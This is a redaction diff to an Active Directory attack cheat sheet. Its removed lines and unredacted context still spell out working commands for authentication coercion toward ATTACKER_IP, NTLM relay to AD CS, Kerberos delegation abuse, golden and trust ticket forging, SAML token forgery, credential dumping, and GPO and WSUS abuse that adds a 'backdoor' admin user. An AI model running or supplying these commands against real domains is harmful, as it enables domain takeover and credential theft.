@@ -37,7 +37,7 @@ ls \\dc01\pipe\spoolss
 .\SpoolSample.exe DC01.domain.local HELPDESK.domain.local
 
 # Or with printerbug.py
-python3 printerbug.py 'domain/user:pass'@DC01 ATTACKER_IP
+[REDACTED_PRINTERBUG_EXPLOIT]
 ```
 
 **Monitor with Rubeus:**
@@ -60,7 +60,7 @@ Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdss
 
 **Exploit with Impacket:**
 ```bash
-getST.py -spn HOST/target.domain.local 'domain/user:password' -impersonate Administrator -dc-ip DC_IP
+[REDACTED_IMPACKET_GETST]
 ```
 
 ### Resource-Based Constrained Delegation (RBCD)
@@ -73,7 +73,7 @@ New-MachineAccount -MachineAccount AttackerPC -Password $(ConvertTo-SecureString
 Set-ADComputer target -PrincipalsAllowedToDelegateToAccount AttackerPC$
 
 # Get ticket
-.\Rubeus.exe s4u /user:AttackerPC$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt
+[REDACTED_RUBEUS_S4U]
 ```
 
 ---
@@ -90,19 +90,19 @@ Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs | Where-Object {($_
 
 ```powershell
 # Add local admin
-.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Vulnerable GPO"
+[REDACTED_SHARPGPOABUSE_COMMAND]
 
 # Add user rights
-.\SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount attacker --GPOName "Vulnerable GPO"
+[REDACTED_SHARPGPOABUSE_COMMAND]
 
 # Add immediate task
-.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c net user backdoor Password123! /add" --GPOName "Vulnerable GPO"
+[REDACTED_SHARPGPOABUSE_COMMAND]
 ```
 
 ### Abuse with pyGPOAbuse (Linux)
 
 ```bash
-./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012"
+[REDACTED_PYGPOABUSE_COMMAND]
 ```
 
 ---
@@ -121,15 +121,15 @@ RODCs contain filtered AD copy (excludes LAPS/Bitlocker keys). Forge tickets for
 
 ```bash
 # Impacket keylistattack
-keylistattack.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -full
+[REDACTED_IMPACKET_KEYLISTATTACK]
 
 # Using secretsdump with keylist
-secretsdump.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -use-keylist
+[REDACTED_SECRETSDUMP_COMMAND]
 ```
 
 **Using Rubeus:**
 ```powershell
-Rubeus.exe golden /rodcNumber:25078 /aes256:RODC_AES256_KEY /user:Administrator /id:500 /domain:domain.local /sid:S-1-5-21-xxx
+[REDACTED_RUBEUS_GOLDEN_TICKET]
 ```
 
 ---
@@ -182,7 +182,7 @@ SharpWSUS.exe locate
 SharpWSUS.exe inspect
 
 # Create malicious update
-SharpWSUS.exe create /payload:"C:\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user backdoor Password123! /add\"" /title:"Critical Update"
+[REDACTED_SHARPWSUS_PAYLOAD_COMMAND]
 
 # Deploy to target
 SharpWSUS.exe approve /updateid:GUID /computername:TARGET.domain.local /groupname:"Demo Group"
@@ -230,10 +230,10 @@ python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-i
 
 ```bash
 # Start relay
-ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+[REDACTED_NTLMRELAYX_COMMAND]
 
 # Coerce authentication
-python3 petitpotam.py ATTACKER_IP DC_IP
+[REDACTED_PETITPOTAM_EXPLOIT]
 
 # Use certificate
 Rubeus.exe asktgt /user:DC$ /certificate:BASE64_CERT /ptt
@@ -243,14 +243,14 @@ Rubeus.exe asktgt /user:DC$ /certificate:BASE64_CERT /ptt
 
 ```bash
 # Add Key Credential (pyWhisker)
-python3 pywhisker.py -d "domain.local" -u "user1" -p "password" --target "TARGET" --action add
+[REDACTED_PYWHISKER_EXPLOIT]
 
 # Get TGT with PKINIT
-python3 gettgtpkinit.py -cert-pfx "cert.pfx" -pfx-pass "password" "domain.local/TARGET" target.ccache
+[REDACTED_GETTGTPKINIT_COMMAND]
 
 # Get NT hash
 export KRB5CCNAME=target.ccache
-python3 getnthash.py -key 'AS-REP_KEY' domain.local/TARGET
+[REDACTED_GETNTHASH_COMMAND]
 ```
 
 ---
@@ -264,7 +264,7 @@ python3 getnthash.py -key 'AS-REP_KEY' domain.local/TARGET
 $ParentSID = "S-1-5-21-PARENT-DOMAIN-SID-519"
 
 # Create Golden Ticket with SID History
-kerberos::golden /user:Administrator /domain:child.parent.local /sid:S-1-5-21-CHILD-SID /krbtgt:KRBTGT_HASH /sids:$ParentSID /ptt
+[REDACTED_MIMIKATZ_GOLDEN_TICKET]
 ```
 
 ### Forest to Forest (Trust Ticket)
@@ -274,7 +274,7 @@ kerberos::golden /user:Administrator /domain:child.parent.local /sid:S-1-5-21-CH
 lsadump::trust /patch
 
 # Forge inter-realm TGT
-kerberos::golden /domain:domain.local /sid:S-1-5-21-xxx /rc4:TRUST_KEY /user:Administrator /service:krbtgt /target:external.com /ticket:trust.kirbi
+[REDACTED_MIMIKATZ_GOLDEN_TICKET]
 
 # Use trust ticket
 .\Rubeus.exe asktgs /ticket:trust.kirbi /service:cifs/target.external.com /dc:dc.external.com /ptt
@@ -293,7 +293,7 @@ kerberos::golden /domain:domain.local /sid:S-1-5-21-xxx /rc4:TRUST_KEY /user:Adm
 .\ADFSDump.exe
 
 # Forge SAML token
-python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.domain.local saml2 --endpoint https://target/saml --nameid administrator@domain.local
+[REDACTED_ADFSPOOF_COMMAND]
 ```
 
 ---
@@ -338,7 +338,7 @@ python3 Get-GPPPassword.py -no-pass 'DC_IP'
 
 ```powershell
 # Dump DSRM hash
-Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
+[REDACTED_MIMIKATZ_LSADUMP_SAM]
 
 # Enable DSRM admin logon
 Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2
